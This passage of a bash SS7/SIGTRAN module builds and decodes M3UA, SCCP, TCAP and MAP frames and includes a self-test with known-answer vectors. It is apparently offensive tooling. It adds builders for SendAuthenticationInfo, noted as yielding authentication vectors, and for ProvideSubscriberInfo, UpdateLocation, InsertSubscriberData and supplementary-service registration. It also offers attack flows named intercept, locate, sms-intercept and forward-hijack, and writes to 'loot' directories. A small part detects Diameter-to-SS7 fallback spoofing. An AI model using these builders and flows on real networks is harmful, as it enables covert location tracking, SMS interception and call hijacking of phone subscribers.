    printf 'm3ua_class\t%s\n'        "$class"
    printf 'm3ua_class_name\t%s\n'   "$(ss7_m3ua_class_name "$class")"
    printf 'm3ua_type\t%s\n'         "$type"
    printf 'm3ua_type_name\t%s\n'    "$(ss7_m3ua_type_name "$class" "$type")"
    printf 'm3ua_length\t%s\n'       "$len"
    (( ver == 1 )) || printf 'warn\tversion %s is not the only defined M3UA version (1)\n' "$ver"
    (( len * 2 <= hexlen )) || {
        printf 'ERROR\tM3UA length %s exceeds the %s octets present\n' "$len" "$(( hexlen / 2 ))" >&2; return 1; }
    (( len * 2 == hexlen )) || printf 'note\t%s octets follow the declared M3UA message and are not part of it\n' "$(( ( hexlen - len * 2 ) / 2 ))"
    local off=16 end=$(( len * 2 )) tag tlen tval pad
    while (( off + 8 <= end )); do
        tag=$(( 16#${hex:$off:4} ))
        tlen=$(( 16#${hex:$(( off + 4 )):4} ))
        (( tlen >= 4 )) || { printf 'ERROR\tparameter length %s is below its 4-octet header\n' "$tlen" >&2; return 1; }
        (( off + tlen * 2 <= end )) || {
            printf 'ERROR\tparameter 0x%04X runs past the message\n' "$tag" >&2; return 1; }
        tval="${hex:$(( off + 8 )):$(( tlen * 2 - 8 ))}"
        printf 'param_tag\t0x%04X\n'  "$tag"
        printf 'param_name\t%s\n'     "$(ss7_m3ua_tag_name "$tag")"
        printf 'param_octets\t%s\n'   "$tlen"
        printf 'param_value\t%s\n'    "$tval"
        (( tag == 0x0210 )) && printf 'protocol_data\t%s\n' "$tval"
        pad=$(( ( 4 - tlen % 4 ) % 4 ))
        off=$(( off + tlen * 2 + pad * 2 ))
    done
    return 0
}

ss7_m3ua_u32() { printf '%08X' "$(( ${1:-0} & 0xFFFFFFFF ))"; }
# Parameter Length is 16 bits and counts the 4-octet tag+length header but
# not the padding (RFC 4666 §3.2); the value that follows is 32 bits.
ss7_m3ua_u16() { printf '%04X' "$(( ${1:-0} & 0xFFFF ))"; }

# Build the M3UA DATA message that carries an MTP3 message. The Protocol Data
# parameter is defined to contain "the original SS7 MTP3 message, including
# the Service Information Octet and Routing Label" (RFC 4666 §3.3.1), so the
# OPC/DPC/SI are NOT arguments here: they are already inside the MSU, and
# accepting them separately would let a caller build a wrapper whose header
# contradicts the message it carries.
ss7_build_m3ua() {  # <msu-hex> [routing-context] [network-appearance]
    local msu; msu=$(ss7_nfc "${1:-}")
    ss7_is_hex "$msu" || { printf 'ERROR\t--build-m3ua needs MSU hex\n' >&2; return 2; }
    local mlen=$(( ${#msu} / 2 ))
    (( mlen >= 5 )) || { printf 'ERROR\tMSU shorter than SIO + routing label (5 octets)\n' >&2; return 1; }
    local rc="${2:-}" na="${3:-}" pc
    for pc in "$rc" "$na"; do
        [[ -z "$pc" ]] && continue
        [[ "$pc" =~ ^[0-9]+$ ]] && (( pc <= 4294967295 )) || {
            printf 'ERROR\trouting context and network appearance are 32-bit unsigned: %s\n' "$(ss7_sanitize "$pc")" >&2; return 2; }
    done
    local body=""
    [[ -n "$na" ]] && body+="0200$(ss7_m3ua_u16 8)$(ss7_m3ua_u32 "$na")"
    [[ -n "$rc" ]] && body+="0006$(ss7_m3ua_u16 8)$(ss7_m3ua_u32 "$rc")"
    local pdlen=$(( mlen + 4 ))
    local pdpad=$(( ( 4 - mlen % 4 ) % 4 ))
    # Parameter padding is at most 3 zero octets and is NOT counted in the
    # parameter length, but IS counted in the M3UA message length.
    local pdpad_hex=""
    (( pdpad > 0 )) && pdpad_hex=$(printf '%0*d' "$(( pdpad * 2 ))" 0)
    body+="0210$(ss7_m3ua_u16 "$pdlen")$msu$pdpad_hex"
    local total=$(( 8 + ${#body} / 2 ))
    printf '01000101%s%s' "$(ss7_m3ua_u32 "$total")" "$body"
}

ss7_cmd_build_m3ua() {  # <msu-hex> [routing-context] [network-appearance]
    local msu; msu=$(ss7_nfc "${1:-}")
    [[ -n "$msu" ]] || { printf 'ERROR\tusage: --build-m3ua <msu-hex> [routing-context] [network-appearance]\n' >&2; return 2; }
    local out
    out=$(ss7_build_m3ua "$msu" "${2:-}" "${3:-}") || return 1
    local mlen=$(( ${#msu} / 2 ))
    printf 'layer\tm3ua\n'
    printf 'message\tDATA (class 1, type 1)\n'
    printf 'msu_octets\t%s\n' "$mlen"
    printf 'msu_hex\t%s\n'   "$msu"
    printf 'protocol_data_tag\t0x0210\n'
    printf 'protocol_data_octets\t%s\n' "$(( mlen + 4 ))"
    printf 'proto_pad_octets\t%s\n' "$(( ( 4 - mlen % 4 ) % 4 ))"
    printf 'm3ua_octets\t%s\n'  "$(( ${#out} / 2 ))"
    printf 'm3ua_hex\t%s\n'     "$out"
    printf 'sctp_ppid\t3\n'
    printf 'sctp_note\t%s\n' "this whole message is the SCTP DATA chunk payload, with the Payload Protocol Identifier set to 3"
    printf 'roundtrip_protocol_data\t%s\n' "$(ss7_m3ua_parse "$out" | awk -F'\t' '$1=="protocol_data"{print $2; exit}')"
}

ss7_cmd_decode_sigtran() {
    local hex; hex=$(ss7_nfc "${1:-}")
    [[ -n "$hex" ]] || { printf 'ERROR\tusage: --decode-sigtran <hex>\n' >&2; return 2; }
    ss7_is_hex "$hex" || { printf 'ERROR\tnot valid hex\n' >&2; return 1; }
    printf 'layer\tsctp\n'
    local sctp; sctp=$(ss7_sctp_strip "$hex") || return 1
    printf '%s\n' "$sctp"
    local payload
    payload=$(printf '%s\n' "$sctp" | awk -F'\t' '$1=="data_payload"{print $2; exit}')
    [[ -n "$payload" ]] || { printf 'ERROR\tthe DATA chunk carries no payload\n' >&2; return 1; }
    local ppid
    ppid=$(printf '%s\n' "$sctp" | awk -F'\t' '$1=="data_ppid"{print $2; exit}')
    [[ "$ppid" == "3" ]] || printf 'warn\tDATA chunk PPID is %s, not 3 (M3UA)\n' "$ppid" >&2
    printf 'layer\tm3ua\n'
    local m3ua; m3ua=$(ss7_m3ua_parse "$payload") || return 1
    printf '%s\n' "$m3ua"
    local pdu
    pdu=$(printf '%s\n' "$m3ua" | awk -F'\t' '$1=="protocol_data"{print $2; exit}')
    [[ -n "$pdu" ]] || {
        printf 'note\t%s\n' "no Protocol Data parameter: this is not a Transfer/DATA message, so there is no MTP3 message to walk" >&2
        return 1; }
    printf 'msu_hex\t%s\n' "$pdu"
    ss7_cmd_decode_msu "$pdu"
}

ss7_cmd_build_sri() {
    local msisdn="${1:-}"
    [[ -n "$msisdn" ]] || { printf 'ERROR\tusage: --build-sri <msisdn>\n' >&2; return 2; }
    local msu inv_hex
    msu=$(ss7_build_sri "$msisdn") || { printf 'ERROR\tcannot encode MSISDN: %s\n' "$(ss7_sanitize "$msisdn")" >&2; return 1; }
    printf 'message\tSendRoutingInfo (SRI)\n'
    printf 'opcode\t22\n'
    printf 'opcode_name\t%s\n' "$(ss7_map_opcode_name 22)"
    printf 'msisdn\t%s\n' "$(ss7_sanitize "$msisdn")"
    printf 'octets\t%s\n' "$(( ${#msu} / 2 ))"
    printf 'hex\t%s\n' "$msu"
    printf 'roundtrip_opcode\t%s\n' "$(ss7_cmd_decode_map "$msu" | awk -F'\t' '$1=="component"{print $5; exit}')"
}

ss7_cmd_build_sri_sm() {
    local msisdn="${1:-}"
    [[ -n "$msisdn" ]] || { printf 'ERROR\tusage: --build-sri-sm <msisdn>\n' >&2; return 2; }
    local msu
    msu=$(ss7_build_sri_sm "$msisdn") || { printf 'ERROR\tcannot encode MSISDN: %s\n' "$(ss7_sanitize "$msisdn")" >&2; return 1; }
    printf 'message\tSendRoutingInfoForSM (SRI-SM)\n'
    printf 'opcode\t45\n'
    printf 'opcode_name\t%s\n' "$(ss7_map_opcode_name 45)"
    printf 'msisdn\t%s\n' "$(ss7_sanitize "$msisdn")"
    printf 'octets\t%s\n' "$(( ${#msu} / 2 ))"
    printf 'hex\t%s\n' "$msu"
    printf 'roundtrip_opcode\t%s\n' "$(ss7_cmd_decode_map "$msu" | awk -F'\t' '$1=="component"{print $5; exit}')"
}

ss7_cmd_build_ati() {
    local imsi="${1:-}"
    [[ -n "$imsi" ]] || { printf 'ERROR\tusage: --build-ati <imsi>\n' >&2; return 2; }
    local msu
    msu=$(ss7_build_ati "$imsi") || { printf 'ERROR\tcannot encode IMSI: %s\n' "$(ss7_sanitize "$imsi")" >&2; return 1; }
    printf 'message\tAnyTimeInterrogation (ATI)\n'
    printf 'opcode\t71\n'
    printf 'opcode_name\t%s\n' "$(ss7_map_opcode_name 71)"
    printf 'imsi\t%s\n' "$(ss7_sanitize "$imsi")"
    printf 'octets\t%s\n' "$(( ${#msu} / 2 ))"
    printf 'hex\t%s\n' "$msu"
    printf 'roundtrip_opcode\t%s\n' "$(ss7_cmd_decode_map "$msu" | awk -F'\t' '$1=="component"{print $5; exit}')"
}

# The remaining MAP operations. These builders already existed but had no CLI
# verb, so the most-used interconnect primitive in the literature -- SAI
# against a chosen IMSI, which yields authentication vectors and therefore the
# Ki-derived material -- could not be produced at all. One function carries
# them so the six verbs cannot drift apart in output shape, and every branch
# goes through the same round-trip decode as --build-sri.
ss7_cmd_build_extra() {  # <verb> [args...]
    local verb="${1:-}"; shift || true
    local msg op label tgt="" msu
    case "$verb" in
        sai)
            [[ -n "${1:-}" ]] || { printf 'ERROR\tusage: --build-sai <imsi> [vectors]\n' >&2; return 2; }
            [[ "${2:-5}" =~ ^[0-9]+$ ]] || { printf 'ERROR\tvector count must be a number: %s\n' "$(ss7_sanitize "${2:-}")" >&2; return 2; }
            msg='SendAuthenticationInfo (SAI)'; op=56; label=imsi; tgt="$1"
            msu=$(ss7_build_sai "$1" "${2:-5}") || { printf 'ERROR\tcannot encode IMSI: %s\n' "$(ss7_sanitize "$1")" >&2; return 1; } ;;
        psi)
            [[ -n "${1:-}" ]] || { printf 'ERROR\tusage: --build-psi <imsi>\n' >&2; return 2; }
            msg='ProvideSubscriberInfo (PSI)'; op=70; label=imsi; tgt="$1"
            msu=$(ss7_build_psi "$1") || { printf 'ERROR\tcannot encode IMSI: %s\n' "$(ss7_sanitize "$1")" >&2; return 1; } ;;
        ulr)
            [[ -n "${1:-}" ]] || { printf 'ERROR\tusage: --build-ulr <imsi> [msc-number] [vlr-number]\n' >&2; return 2; }
            msg='UpdateLocation (ULR)'; op=2; label=imsi; tgt="$1"
            msu=$(ss7_build_ulr "$1" "${2:-}" "${3:-}") || { printf 'ERROR\tcannot encode IMSI: %s\n' "$(ss7_sanitize "$1")" >&2; return 1; } ;;
        isd)
            [[ -n "${1:-}" ]] || { printf 'ERROR\tusage: --build-isd <imsi>\n' >&2; return 2; }
            msg='InsertSubscriberData (ISD)'; op=7; label=imsi; tgt="$1"
            msu=$(ss7_build_isd "$1") || { printf 'ERROR\tcannot encode IMSI: %s\n' "$(ss7_sanitize "$1")" >&2; return 1; } ;;
        register-ss)
            local code="${1:-33}"
            [[ "$code" =~ ^[0-9]+$ ]] && (( code <= 255 )) || { printf 'ERROR\tusage: --build-register-ss [ss-code 0-255] [forwarded-number]\n' >&2; return 2; }
            msg='RegisterSS (supplementary service)'; op=10; label=ss_code; tgt="$code"
            msu=$(ss7_build_register_ss "$code" "${2:-}") || { printf 'ERROR\tcannot encode SS code\n' >&2; return 1; } ;;
        activate-ss)
            local code="${1:-33}"
            [[ "$code" =~ ^[0-9]+$ ]] && (( code <= 255 )) || { printf 'ERROR\tusage: --build-activate-ss [ss-code 0-255]\n' >&2; return 2; }
            msg='ActivateSS (supplementary service)'; op=12; label=ss_code; tgt="$code"
            msu=$(ss7_build_activate_ss "$code") || { printf 'ERROR\tcannot encode SS code\n' >&2; return 1; } ;;
        *)  printf 'ERROR\tunknown build verb: %s\n' "$(ss7_sanitize "${verb:-<none>}")" >&2; return 2 ;;
    esac
    printf 'message\t%s\n'     "$msg"
    printf 'opcode\t%s\n'      "$op"
    printf 'opcode_name\t%s\n' "$(ss7_map_opcode_name "$op")"
    printf '%s\t%s\n'          "$label" "$(ss7_sanitize "$tgt")"
    if [[ "$label" == ss_code ]]; then
        printf 'ss_name\t%s\n' "$(ss7_ss_code_name "$tgt")"
    fi
    printf 'octets\t%s\n'      "$(( ${#msu} / 2 ))"
    printf 'hex\t%s\n'         "$msu"
    printf 'roundtrip_opcode\t%s\n' "$(ss7_cmd_decode_map "$msu" | awk -F'\t' '$1=="component"{print $5; exit}')"
}

ss7_cmd_flow() {
    local flow="${1:-}"
    [[ -n "$flow" ]] || { printf 'ERROR\tusage: --flow <intercept|locate|sms-intercept|forward-hijack> [msisdn] [imsi] [opc] [dpc]\n' >&2; return 2; }
    ss7_flow "$flow" "${2:-}" "${3:-}" "${4:-}" "${5:-}"
}

ss7_cmd_ssn() {
    local n="${1:-}"
    [[ "$n" =~ ^[0-9]+$ ]] && (( n <= 255 )) || { printf 'ERROR\tusage: --ssn <0-255>\n' >&2; return 2; }
    printf 'ssn\t%s\n' "$n"
    printf 'name\t%s\n' "$(ss7_ssn_name "$n")"
}

ss7_cmd_pc() {
    local pc="${1:-}" fmt="${2:-3-8-3}"
    [[ "$pc" =~ ^[0-9]+$ ]] && (( pc <= 16383 )) || { printf 'ERROR\tusage: --pc-format <0-16383> [structure]\n' >&2; return 2; }
    local out; out=$(ss7_pc_format "$pc" "$fmt") || {
        printf 'ERROR\tunknown or invalid point-code structure: %s (valid: raw 3-8-3 4-4-4-2 3-3-2-4-2 7-7; widths must sum to 14)\n' \
            "$(ss7_sanitize "$fmt")" >&2; return 1
    }
    printf 'pc\t%s\n' "$pc"
    printf 'structure\t%s\n' "$(ss7_sanitize "$fmt")"
    printf 'formatted\t%s\n' "$out"
    local back; back=$(ss7_pc_parse "$out" "$fmt") || return 1
    printf 'roundtrip\t%s\n' "$back"
}

ss7_cmd_opcode() {
    local n="${1:-}"
    [[ "$n" =~ ^[0-9]+$ ]] || { printf 'ERROR\tusage: --opcode <n>\n' >&2; return 2; }
    local name status
    name=$(ss7_map_opcode_name "$n")
    if [[ "$name" == "unassigned/unknown" ]]; then
        status=unassigned
    elif ss7_map_opcode_withdrawn "$n"; then
        status=withdrawn
    elif ss7_map_opcode_dissector "$n"; then
        status=dissector-only
    else
        status=active
    fi
    printf 'opcode\t%s\n' "$n"
    printf 'name\t%s\n' "$name"
    printf 'assigned\t%s\n' "$([[ "$status" == active ]] && echo yes || echo no)"
    printf 'status\t%s\n' "$status"
}

# ── selftest — no radio, no root, no network ────────────────────────────
# ── Diameter<->SS7 fallback and Visited-PLMN spoofing ───────────────────
# Citizen Lab "Bad Connection" (2026): a roaming handset keeps a combined
# 3G+4G registration, so a Diameter location query the MME would reject can
# be reissued as an SS7 MAP query against the VLR, which has no equivalent
# origin check. This decodes a Diameter Visited-PLMN-Id and detects the pivot.
ss7_visited_plmn() {
    local h; h=$(ss7_nfc "${1:-}" | tr 'A-F' 'a-f')
    [[ "$h" =~ ^[0-9a-f]{6}$ ]] || { printf 'ERROR\tVisited-PLMN-Id is 3 octets of hex\n' >&2; return 2; }
    local o1=$(( 16#${h:0:2} )) o2=$(( 16#${h:2:2} )) o3=$(( 16#${h:4:2} ))
    local mcc1=$(( o1 & 0xF )) mcc2=$(( (o1 >> 4) & 0xF )) mcc3=$(( o2 & 0xF ))
    local mnc1=$(( o3 & 0xF )) mnc2=$(( (o3 >> 4) & 0xF )) mnc3=$(( (o2 >> 4) & 0xF ))
    local mcc="${mcc1}${mcc2}${mcc3}" mnc
    if (( mnc3 == 0xF )); then mnc="${mnc1}${mnc2}"; else mnc="${mnc1}${mnc2}${mnc3}"; fi
    printf 'mcc\t%s\nmnc\t%s\nplmn\t%s-%s\n' "$mcc" "$mnc" "$mcc" "$mnc"
    if [[ "$h" == "000000" ]]; then
        printf 'finding\tHIGH\tVisited-PLMN-Id 0000 — the spoofed value STA2 used to slip a Diameter Authentication-Information-Request past origin validation\n'
    elif [[ "$mcc" == "000" ]]; then
        printf 'finding\tMEDIUM\tMCC 000 (test/reserved) — a Diameter query carrying it is suspect\n'
    else
        printf 'finding\tINFO\tvalid-looking Visited-PLMN-Id\n'
    fi
}
ss7_fallback_detect() {
    local file="${1:-}"
    [[ -f "$file" ]] || { printf 'ERROR\tno such signalling file: %s\n' "$file" >&2; return 1; }
    printf 'subscriber\twhen\tfinding\n'
    awk -F'\t' '
        NR==1 && $1 ~ /^ts/ { next }
        NF>=3 {
            s=$3; proto=tolower($2)
            # only a location/auth query counts, not arbitrary traffic
            act=tolower($4)
            if (act !~ /locate|location|auth|provide|ati|sri|update/) next
            if (proto ~ /diameter/) { dsub[s]=1; any[s]=1 }
            else if (proto ~ /ss7/ || proto ~ /map/) {
                any[s]=1
                if (dsub[s]==1 && !done[s]) {
                    printf "%s\t%s\tDiameter probe followed by an SS7 query for the same subscriber\n", s, $1
                    done[s]=1; n++
                }
            }
        }
        END { printf "summary\t-\t%d fallback transition(s)\n", n+0 }' "$file"
}

ss7_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad + 1)); fi
    }
    fld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }

    local d out rc
    d=$(mktemp -d "$MOD_TMP/selftest.XXXXXX") || {
        printf 'ERROR\tmktemp failed under %s\n' "$MOD_TMP" >&2; return 1; }
    local _prev_trap; _prev_trap=$(trap -p EXIT)
    trap 'rm -rf "$d"' EXIT
    export LOOT_DIR="$d/loot"
    export CAPTURES_DIR="$d/captures"
    export STATE_DIR="$d/state"
    export SS7_DIR="$d/loot/ss7_map"
    export SS7_PLANS="$SS7_DIR/plans"
    mkdir -p "$SS7_PLANS"

    # ── 1. MTP3 routing label, known answer from tshark 4.2.2 ───────────
    # tshark -V on a DLT_MTP3 frame with label 12 34 56 78 reports
    # DPC 13330, OPC 8536, SLS 7. The label is built from those three values
    # and must come back byte-identical, then parse back to the same numbers.
    out=$(ss7_label_build 13330 8536 7); rc=$?
    chk label-build-rc  "$rc" "0"
    chk label-build-hex "$out" "12345678"
    out=$(ss7_label_parse "12345678"); rc=$?
    chk label-parse-rc  "$rc" "0"
    chk label-dpc       "$(fld "$out" dpc)" "13330"
    chk label-opc       "$(fld "$out" opc)" "8536"
    chk label-sls       "$(fld "$out" sls)" "7"
    # Second tshark-known vector: label 01 80 00 00 is DPC 1, OPC 2, SLS 0.
    chk label-build-2   "$(ss7_label_build 1 2 0)" "01800000"
    out=$(ss7_label_parse "01800000")
    chk label-dpc-2     "$(fld "$out" dpc)" "1"
    chk label-opc-2     "$(fld "$out" opc)" "2"
    # The full 14 bits must be reachable: all-ones label is DPC/OPC/SLS max.
    out=$(ss7_label_parse "FFFFFFF0")
    chk label-dpc-max   "$(fld "$out" dpc)" "16383"
    chk label-opc-max   "$(fld "$out" opc)" "1023"
    chk label-sls-max   "$(fld "$out" sls)" "15"
    chk label-oob       "$(ss7_label_build 16384 0 0 >/dev/null 2>&1; echo $?)" "1"
    chk label-short     "$(ss7_label_parse 1234 >/dev/null 2>&1; echo $?)" "1"

    # ── 2. Structured point codes, known answers ────────────────────────
    # Oracle EAGLE, "14-Bit ITU National Point Code Formats": the worked
    # examples state 14781 = 3-8-3 "7-55-5" and, for 4-4-4-2, "14-6-15-1".
    chk pc-3-8-3-14781  "$(ss7_pc_format 14781 3-8-3)"   "7-55-5"
    chk pc-4-4-4-2-14781 "$(ss7_pc_format 14781 4-4-4-2)" "14-6-15-1"
    chk pc-3-8-3-695    "$(ss7_pc_format 695 3-8-3)"     "0-86-7"
    # Wireshark 4.2.2 renders the same 14-bit value 13330 as 3-8-3 "6-130-2".
    chk pc-3-8-3-13330  "$(ss7_pc_format 13330 3-8-3)"   "6-130-2"
    # The 3-3-2-4-2 split is the five-part national form; only a complete
    # 14-bit split is accepted, so the literal "3-3-2-4" (sum 12) is rejected.
    chk pc-3-3-2-4-2    "$(ss7_pc_format 14781 3-3-2-4-2)" "7-1-2-15-1"
    chk pc-3324-reject  "$(ss7_pc_format 14781 3-3-2-4 >/dev/null 2>&1; echo $?)" "1"
    chk pc-33242-parse  "$(ss7_pc_parse '7-1-2-15-1' 3-3-2-4-2)" "14781"
    chk pc-383-parse    "$(ss7_pc_parse '7-55-5' 3-8-3)" "14781"
    chk pc-4442-parse   "$(ss7_pc_parse '14-6-15-1' 4-4-4-2)" "14781"
    chk pc-raw-roundtrip "$(ss7_pc_parse "$(ss7_pc_format 14781 raw)" raw)" "14781"
    chk pc-width-oob    "$(ss7_pc_parse '8-0-0' 3-8-3 >/dev/null 2>&1; echo $?)" "1"
    chk pc-bad-structure "$(ss7_pc_format 1 nope >/dev/null 2>&1; echo $?)" "1"

    # ── 3. SIO and MTP2/MTP3 names, known answers from tshark ───────────
    out=$(ss7_sio_parse 83)
    chk sio-ni      "$(fld "$out" ni)" "2"
    chk sio-ni-name "$(fld "$out" ni_name)" "national network"
    chk sio-si      "$(fld "$out" si)" "3"
    chk sio-si-name "$(fld "$out" si_name)" "SCCP"
    chk sio-bad     "$(ss7_sio_parse zz >/dev/null 2>&1; echo $?)" "1"
    chk lssu-sios   "$(ss7_lssu_name 3)" "SIOS (Status Indication Out of Service)"
    chk lssu-sipo   "$(ss7_lssu_name 4)" "SIPO (Status Indication Processor Outage)"
    chk h0-4        "$(ss7_mtp3_h0_name 4)" "Transfer prohibited-allowed-restricted messages"
    chk h0-unknown  "$(ss7_mtp3_h0_name 0xff)" "unknown"

    # ── 4. SCCP SSN table, known answers from tshark + TelcoBridges ─────
    chk ssn-5   "$(ss7_ssn_name 5)"   "MAP (Mobile Application Part)"
    chk ssn-6   "$(ss7_ssn_name 6)"   "HLR (Home Location Register)"
    chk ssn-7   "$(ss7_ssn_name 7)"   "VLR (Visitor Location Register)"
    chk ssn-8   "$(ss7_ssn_name 8)"   "MSC (Mobile Switching Center)"
    chk ssn-9   "$(ss7_ssn_name 9)"   "EIC/EIR (Equipment Identifier Center/Equipment Identification Register)"
    chk ssn-10  "$(ss7_ssn_name 10)"  "AUC/AC (Authentication Center)"
    chk ssn-145 "$(ss7_ssn_name 145)" "GMLC (Gateway Mobile Location Centre, MAP)"
    chk ssn-146 "$(ss7_ssn_name 146)" "CAP (CAMEL application part)"
    chk ssn-149 "$(ss7_ssn_name 149)" "SGSN (MAP)"
    chk ssn-150 "$(ss7_ssn_name 150)" "GGSN (MAP)"
    chk ssn-255 "$(ss7_ssn_name 255)" "unknown"
    # Regression guard: the brief for this module claimed 146 = GMLC. Both
    # Wireshark 4.2.2 and the TelcoBridges SSN table say 145 = GMLC and
    # 146 = CAP. Assert the negative so the wrong constant cannot come back.
    chk ssn-146-not-gmlc "$(ss7_ssn_name 146 | grep -c 'GMLC')" "0"

    # ── 5. SCCP message types and the UDT round-trip ────────────────────
    chk sccp-09 "$(ss7_sccp_type_name 9)"  "UDT (Unitdata)"
    chk sccp-0a "$(ss7_sccp_type_name 10)" "UDTS (Unitdata Service)"
    chk sccp-11 "$(ss7_sccp_type_name 17)" "XUDT (Extended Unitdata)"
    # tshark 4.2.2 parses this exact frame as UDT with called PC 1 / SSN 6 and
    # calling PC 2 / SSN 8. Byte-exact build:
    local udt; udt=$(ss7_sccp_build_udt 1 6 2 8 4142434445)
    chk udt-hex "$udt" "090003070B04030100060403020008054142434445"
    out=$(ss7_sccp_parse "$udt"); rc=$?
    chk udt-parse-rc   "$rc" "0"
    chk udt-type       "$(fld "$out" sccp_message_type)" "09"
    chk udt-called-pc  "$(fld "$out" called_pc)" "1"
    chk udt-called-ssn "$(fld "$out" called_ssn)" "6"
    chk udt-called-name "$(fld "$out" called_ssn_name)" "HLR (Home Location Register)"
    chk udt-calling-pc "$(fld "$out" calling_pc)" "2"
    chk udt-calling-ssn "$(fld "$out" calling_ssn)" "8"
    chk udt-data       "$(fld "$out" sccp_data)" "4142434445"
    # Address indicator bits: AI 0x03 is PC present + SSN present, route-on-SSN.
    out=$(ss7_sccp_addr_decode "0301000604")
    chk ai-pc-ind "$(fld "$out" pc_indicator)" "1"
    chk ai-ssn-ind "$(fld "$out" ssn_indicator)" "1"
    chk ai-gti    "$(fld "$out" gt_indicator)" "0"
    chk ai-pc     "$(fld "$out" pc)" "1"
    chk ai-ssn    "$(fld "$out" ssn)" "6"
    # GT 0100: tshark decodes the digits of 33 61 23 45 67 F8 as 33163254768.
    out=$(ss7_sccp_addr_decode "12040011913361234567F8")
    chk gt-ind    "$(fld "$out" gt_indicator)" "4"
    chk gt-tt     "$(fld "$out" gt_translation_type)" "0"
    chk gt-np     "$(fld "$out" gt_numbering_plan)" "1"
    chk gt-es     "$(fld "$out" gt_encoding_scheme)" "1"
    chk gt-digits "$(fld "$out" gt_digits)" "33163254768"
    chk udt-bad-type "$(ss7_sccp_addr_encode 1 300 >/dev/null 2>&1; echo $?)" "1"

    # ── 6. TCAP component parse, known answer from tshark 4.2.2 ─────────
    # A hand-built component portion carrying invokeID 1 and opcode 22.
    out=$(ss7_tcap_parse "6C08A106020101020116"); rc=$?
    chk tcap-parse-rc   "$rc" "0"
    chk tcap-comp-count "$(printf '%s\n' "$out" | grep -c '^component')" "1"
    chk tcap-comp-type  "$(printf '%s\n' "$out" | awk -F'\t' '$1=="component"{print $3}')" "invoke"
    chk tcap-comp-iid   "$(printf '%s\n' "$out" | awk -F'\t' '$1=="component"{print $4}')" "1"
    chk tcap-comp-op    "$(printf '%s\n' "$out" | awk -F'\t' '$1=="component"{print $5}')" "22"
    chk tcap-comp-opname "$(printf '%s\n' "$out" | awk -F'\t' '$1=="component"{print $6}')" "sendRoutingInfo"
    # tshark names the component tags: A1 invoke, A2 returnResultLast,
    # A3 returnError, A4 reject.
    chk comp-a1 "$(ss7_tcap_component_name A1)" "invoke"
    chk comp-a2 "$(ss7_tcap_component_name A2)" "returnResultLast"
    chk comp-a3 "$(ss7_tcap_component_name A3)" "returnError"
    chk comp-a4 "$(ss7_tcap_component_name A4)" "reject"
    chk comp-a7 "$(ss7_tcap_component_name A7)" "returnResultNotLast"
    # Wireshark 4.2.2 reads this exact frame as returnResultLast for opcode 22
    # with the roaming number 33163254768: the inner result SEQUENCE has to be
    # entered or the response decodes as an unnamed hex tail.
    out=$(ss7_tcap_parse "621B4804000000016C13A211020101300C0201168007913386090000F0")
    chk resp-cname  "$(printf '%s\n' "$out" | awk -F'\t' '$1=="component"{print $3}')" "returnResultLast"
    chk resp-op     "$(printf '%s\n' "$out" | awk -F'\t' '$1=="component"{print $5}')" "22"
    chk resp-opname "$(printf '%s\n' "$out" | awk -F'\t' '$1=="component"{print $6}')" "sendRoutingInfo"
    chk resp-param  "$(printf '%s\n' "$out" | awk -F'\t' '$1=="component"{print $7}')" "8007913386090000F0"
    # A returnError carries an ERROR code from its own number space. Reading
    # it as an operation code stamped error 34 with sendRoutingInfoForLCS and
    # error 4 (unassigned as an error) with provideRoamingNumber.
    out=$(ss7_tcap_parse "64104904000000076C08A306020101020122")
    chk err-34 "$(printf '%s\n' "$out" | awk -F'\t' '$1=="component"{print $6}')" "systemFailure"
    out=$(ss7_tcap_parse "64104904000000076C08A306020101020104")
    chk err-4  "$(printf '%s\n' "$out" | awk -F'\t' '$1=="component"{print $6}')" "unassigned/unknown"
    # The reject problem is a CHOICE on a context tag: [1] invokeProblem.
    out=$(ss7_tcap_parse "64104904000000076C08A406020101810101")
    chk rej-problem "$(printf '%s\n' "$out" | awk -F'\t' '$1=="component"{print $6}')" "invokeProblem"
    chk rej-value   "$(printf '%s\n' "$out" | awk -F'\t' '$1=="component"{print $7}')" "01"
    # A number with a non-digit must be refused: stripping every non-digit
    # silently encoded "12x4" as 124, a frame for a number nobody typed.
    chk msisdn-plus       "$(ss7_msisdn_hex +33612345678)" "913316325476F8"
    chk msisdn-mangled    "$(ss7_msisdn_hex 12x4 >/dev/null 2>&1; echo $?)" "1"
    chk imsi-mangled      "$(ss7_imsi_hex 31015x123456789 >/dev/null 2>&1; echo $?)" "1"
    chk build-mangled-rc  "$(ss7_cmd_build_sri 12x4 >/dev/null 2>&1; echo $?)" "1"
    # A BEGIN transaction: tshark reports begin / otid 00000001 / 1 component.
    local tcap; tcap=$(ss7_tcap_begin "00000001" "A106020101020116")
    chk tcap-begin-hex "$tcap" "62104804000000016C08A106020101020116"
    out=$(ss7_tcap_parse "$tcap")
    chk tcap-begin-type "$(fld "$out" tcap_message_type)" "begin"
    chk tcap-begin-otid "$(fld "$out" otid)" "00000001"
    chk tcap-begin-comps "$(printf '%s\n' "$out" | grep -c '^component')" "1"
    chk tcap-short "$(ss7_tcap_parse 6C >/dev/null 2>&1; echo $?)" "1"

    # ── 7. MAP operation table, known answers from tshark + TS 29.002 ───
    chk map-2   "$(ss7_map_opcode_name 2)"   "updateLocation"
    chk map-7   "$(ss7_map_opcode_name 7)"   "insertSubscriberData"
    chk map-10  "$(ss7_map_opcode_name 10)"  "registerSS"
    chk map-12  "$(ss7_map_opcode_name 12)"  "activateSS"
    chk map-22  "$(ss7_map_opcode_name 22)"  "sendRoutingInfo"
    chk map-45  "$(ss7_map_opcode_name 45)"  "sendRoutingInfoForSM"
    chk map-56  "$(ss7_map_opcode_name 56)"  "sendAuthenticationInfo"
    chk map-62  "$(ss7_map_opcode_name 62)"  "anyTimeSubscriptionInterrogation"
    chk map-70  "$(ss7_map_opcode_name 70)"  "provideSubscriberInfo"
    chk map-71  "$(ss7_map_opcode_name 71)"  "anyTimeInterrogation"
    chk map-83  "$(ss7_map_opcode_name 83)"  "provideSubscriberLocation"
    chk map-85  "$(ss7_map_opcode_name 85)"  "sendRoutingInfoForLCS"
    # 44/46 are spec-sourced (TS 29.002 §17.4.1; Wireshark needs an SMS
    # application context before it will name them).
    chk map-44  "$(ss7_map_opcode_name 44)"  "mt-ForwardSM"
